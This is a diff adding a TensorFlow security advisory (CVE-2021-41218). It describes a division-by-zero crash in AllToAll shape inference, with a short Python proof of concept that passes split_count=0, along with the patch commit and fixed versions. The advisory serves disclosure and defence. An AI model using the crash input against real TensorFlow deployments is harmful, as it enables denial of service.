@@ -1,0 +1,33 @@
+<h2>TFSA-2021-176: Integer division by 0 in <code>tf.raw_ops.AllToAll</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-41218</p>
+<h3>Impact</h3>
+<p>The <a href="https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/tpu_cross_replica_ops.cc#L25-L74">shape inference code for <code>AllToAll</code></a> can be made to execute a division by 0:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>@tf.function
+def func():
+  return tf.raw_ops.AllToAll(
+    input=[0.0, 0.1652, 0.6543],
+    group_assignment=[1, -1],
+    concat_dimension=0,
+    split_dimension=0,
+    split_count=0)</p>
+<p>func()
+```</p>
+<p>This occurs whenever the <code>split_count</code> argument is 0:</p>
+<p><code>cc
+TF_RETURN_IF_ERROR(c-&gt;GetAttr("split_count", &amp;split_count));
+...
+for (int32_t i = 0; i &lt; rank; ++i) {
+  ...
+  dims[i] = c-&gt;MakeDim(c-&gt;Value(dims[i]) / split_count);
+  ...
+}</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc">a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc</a>.</p>
+<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>
